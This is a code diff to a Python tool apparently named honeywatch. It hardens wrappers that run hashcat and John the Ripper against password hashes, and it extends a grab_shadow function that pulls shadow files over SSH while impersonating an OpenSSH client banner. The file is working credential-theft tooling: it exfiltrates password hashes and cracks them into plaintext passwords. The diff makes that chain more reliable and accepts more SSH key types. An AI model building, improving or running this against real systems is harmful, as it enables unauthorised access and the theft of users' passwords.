@@ -201,6 +201,10 @@ def _run(argv: list[str], timeout_s: float | None, env: dict[str, str] | None = 
         )
     except FileNotFoundError:
         return None, "", "", f"binary not found: {argv[0]}"
+    except OSError as exc:
+        # Any other launch failure (permissions, exec format, etc.) -- don't
+        # let it escape and leak the caller's temp dir; honor "never raises".
+        return None, "", "", f"failed to launch {argv[0]}: {exc}"
     except subprocess.TimeoutExpired as exc:
         out = exc.stdout or ""
         err = exc.stderr or ""
@@ -270,58 +274,59 @@ def crack_with_hashcat(
         mode = next(iter(modes))
 
     tmp_dir = tempfile.mkdtemp(prefix="honeywatch_hashcat_")
-    hashfile = os.path.join(tmp_dir, "hashes.txt")
-    _write_hashfile(entries, hashfile)
-    # hashcat wants bare hashes; emit a second file without the user prefix.
-    bare_hashfile = os.path.join(tmp_dir, "bare.txt")
-    with open(bare_hashfile, "w", encoding="utf-8") as fh:
-        for e in entries:
-            fh.write(e.hash + "\n")
-    if potfile is None:
-        potfile = os.path.join(tmp_dir, "hashcat.potfile")
+    try:
+        # hashcat wants bare hashes (no user prefix); emit just those.
+        bare_hashfile = os.path.join(tmp_dir, "bare.txt")
+        with open(bare_hashfile, "w", encoding="utf-8") as fh:
+            for e in entries:
+                fh.write(e.hash + "\n")
+        if potfile is None:
+            potfile = os.path.join(tmp_dir, "hashcat.potfile")
 
-    argv = [
-        bin_path,
-        "-m", str(mode),
-        "-a", "0",
-        "--potfile-path", potfile,
-        "--quiet",
-        bare_hashfile,
-        wordlist,
-    ]
-    if extra_args:
-        argv += list(extra_args)
+        argv = [
+            bin_path,
+            "-m", str(mode),
+            "-a", "0",
+            "--potfile-path", potfile,
+            "--quiet",
+            bare_hashfile,
+            wordlist,
+        ]
+        if extra_args:
+            argv += list(extra_args)
 
-    rc, out, err, run_error = _run(argv, timeout_s)
-    result.returncode = rc
-    result.stdout = out
-    result.stderr = err
-    result.potfile = potfile
-    if run_error:
-        result.error = run_error
-        _cleanup(tmp_dir)
+        rc, out, err, run_error = _run(argv, timeout_s)
+        result.returncode = rc
+        result.stdout = out
+        result.stderr = err
+        result.potfile = potfile
+        if run_error:
+            result.error = run_error
+            return result
+
+        # Read back cracked passwords with --show. hashcat --show prints
+        # ``hash:password`` for recovered hashes.
+        show_argv = [bin_path, "-m", str(mode), "--potfile-path", potfile,
+                     "--show", bare_hashfile]
+        rc2, out2, err2, run_error2 = _run(show_argv, timeout_s, )
+        if run_error2:
+            # If --show failed we still return what the run produced.
+            result.cracked = [CrackedHash(user=e.user, hash=e.hash, success=False,
+                                         error="show-failed") for e in entries]
+        else:
+            recovered = _parse_hashcat_show(out2)
+            for e in entries:
+                pw = recovered.get(e.hash)
+                result.cracked.append(
+                    CrackedHash(user=e.user, hash=e.hash, password=pw,
+                                success=pw is not None)
+                )
+        result.attempted = len(entries)
         return result
-
-    # Read back cracked passwords with --show. hashcat --show prints
-    # ``hash:password`` for recovered hashes.
-    show_argv = [bin_path, "-m", str(mode), "--potfile-path", potfile,
-                 "--show", bare_hashfile]
-    rc2, out2, err2, run_error2 = _run(show_argv, timeout_s, )
-    if run_error2:
-        # If --show failed we still return what the run produced.
-        result.cracked = [CrackedHash(user=e.user, hash=e.hash, success=False,
-                                     error="show-failed") for e in entries]
-    else:
-        recovered = _parse_hashcat_show(out2)
-        for e in entries:
-            pw = recovered.get(e.hash)
-            result.cracked.append(
-                CrackedHash(user=e.user, hash=e.hash, password=pw,
-                            success=pw is not None)
-            )
-    result.attempted = len(entries)
-    _cleanup(tmp_dir)
-    return result
+    finally:
+        # Always reclaim the temp dir, even if an unexpected exception escapes
+        # _run's "never raises" contract or a file write fails.
+        _cleanup(tmp_dir)
 
 
 def _parse_hashcat_show(text: str) -> dict[str, str]:
@@ -365,47 +370,48 @@ def crack_with_john(
     result.john_format = next(iter(fmts), None) if len(fmts) == 1 else None
 
     tmp_dir = tempfile.mkdtemp(prefix="honeywatch_john_")
-    hashfile = os.path.join(tmp_dir, "shadow.txt")
-    _write_hashfile(entries, hashfile)
-    if potfile is None:
-        potfile = os.path.join(tmp_dir, "john.pot")
+    try:
+        hashfile = os.path.join(tmp_dir, "shadow.txt")
+        _write_hashfile(entries, hashfile)
+        if potfile is None:
+            potfile = os.path.join(tmp_dir, "john.pot")
 
-    argv = [bin_path, f"--wordlist={wordlist}", f"--pot={potfile}"]
-    if result.john_format:
-        argv.append(f"--format={result.john_format}")
-    if extra_args:
-        argv += list(extra_args)
-    argv.append(hashfile)
+        argv = [bin_path, f"--wordlist={wordlist}", f"--pot={potfile}"]
+        if result.john_format:
+            argv.append(f"--format={result.john_format}")
+        if extra_args:
+            argv += list(extra_args)
+        argv.append(hashfile)
 
-    rc, out, err, run_error = _run(argv, timeout_s)
-    result.returncode = rc
-    result.stdout = out
-    result.stderr = err
-    result.potfile = potfile
-    if run_error:
-        result.error = run_error
-        _cleanup(tmp_dir)
+        rc, out, err, run_error = _run(argv, timeout_s)
+        result.returncode = rc
+        result.stdout = out
+        result.stderr = err
+        result.potfile = potfile
+        if run_error:
+            result.error = run_error
+            return result
+
+        # john --show prints "user:password" lines plus a summary count.
+        show_argv = [bin_path, "--show", f"--pot={potfile}", hashfile]
+        if result.john_format:
+            show_argv.append(f"--format={result.john_format}")
+        rc2, out2, err2, run_error2 = _run(show_argv, timeout_s)
+        if run_error2:
+            result.cracked = [CrackedHash(user=e.user, hash=e.hash, success=False,
+                                          error="show-failed") for e in entries]
+        else:
+            recovered = _parse_john_show(out2)
+            for e in entries:
+                pw = recovered.get(e.user)
+                result.cracked.append(
+                    CrackedHash(user=e.user, hash=e.hash, password=pw,
+                                success=pw is not None)
+                )
+        result.attempted = len(entries)
         return result
-
-    # john --show prints "user:password" lines plus a summary count.
-    show_argv = [bin_path, "--show", f"--pot={potfile}", hashfile]
-    if result.john_format:
-        show_argv.append(f"--format={result.john_format}")
-    rc2, out2, err2, run_error2 = _run(show_argv, timeout_s)
-    if run_error2:
-        result.cracked = [CrackedHash(user=e.user, hash=e.hash, success=False,
-                                      error="show-failed") for e in entries]
-    else:
-        recovered = _parse_john_show(out2)
-        for e in entries:
-            pw = recovered.get(e.user)
-            result.cracked.append(
-                CrackedHash(user=e.user, hash=e.hash, password=pw,
-                            success=pw is not None)
-            )
-    result.attempted = len(entries)
-    _cleanup(tmp_dir)
-    return result
+    finally:
+        _cleanup(tmp_dir)
 
 
 def _parse_john_show(text: str) -> dict[str, str]:
@@ -471,6 +477,7 @@ def crack_shadow(
 
     merged = HashCrackResult(tool=tool, wordlist=wordlist, mode=mode)
     merged.attempted = len(entries)
+    merged.returncode = 0
     for family, group in by_family.items():
         if tool == "hashcat":
             family_mode = mode if mode is not None else group[0].hashcat_mode
@@ -490,7 +497,10 @@ def crack_shadow(
         merged.cracked.extend(res.cracked)
         if res.error and not merged.error:
             merged.error = f"{family}: {res.error}"
-        if res.returncode is not None:
+        # Aggregate returncode across families: a non-zero (failure) from any
+        # family is preserved; a later successful family must not overwrite it
+        # back to 0. Only stays 0 when every family that ran returned 0.
+        if res.returncode not in (None, 0) and merged.returncode == 0:
             merged.returncode = res.returncode
         merged.stdout += res.stdout
         merged.stderr += res.stderr
@@ -500,6 +510,29 @@ def crack_shadow(
 # --------------------------------------------------------------------------- #
 # Shadow exfiltration over SSH (closes the online -> offline loop)
 # --------------------------------------------------------------------------- #
+
+
+# Private key types to try, in order. paramiko has no universal loader that
+# picks the class from the file header, so we try each until one parses. This
+# supports ed25519/ecdsa/rsa/dss keys instead of only RSA.
+_KEY_CLASSES = ("Ed25519Key", "ECDSAKey", "RSAKey", "DSSKey")
+
+
+def _load_private_key(paramiko_module: Any, key_path: str) -> Any:
+    """Load a private key file, trying each paramiko key class in turn."""
+    last_exc: Exception | None = None
+    for cls_name in _KEY_CLASSES:
+        cls = getattr(paramiko_module, cls_name, None)
+        if cls is None:
+            continue
+        try:
+            return cls.from_private_key_file(key_path)
+        except Exception as exc:  # wrong key type -> try the next class
+            last_exc = exc
+            continue
+    raise paramiko_module.SSHException(
+        f"could not load private key {key_path!r}: {last_exc!r}"
+    )
 
 
 def grab_shadow(
@@ -545,7 +578,7 @@ def grab_shadow(
         transport.local_version = "SSH-2.0-OpenSSH_9.0p1 Debian-1"
         transport.start_client(timeout=timeout_s)
         if key_path:
-            pkey = paramiko.RSAKey.from_private_key_file(key_path)
+            pkey = _load_private_key(paramiko, key_path)
             transport.auth_publickey(user, pkey)
         else:
             transport.auth_password(user, password or "")
@@ -595,5 +628,9 @@ def _cleanup(path: str) -> None:
 
 
 def _shlex_split(value: str) -> list[str]:
-    """Split a user-supplied extra-args string the way a shell would."""
+    """Split a user-supplied extra-args string the way a shell would.
+
+    Kept as a small public helper for callers that want shell-style splitting
+    of ``extra_args``; the crack functions themselves take pre-split lists.
+    """
     return shlex.split(value) if value else []
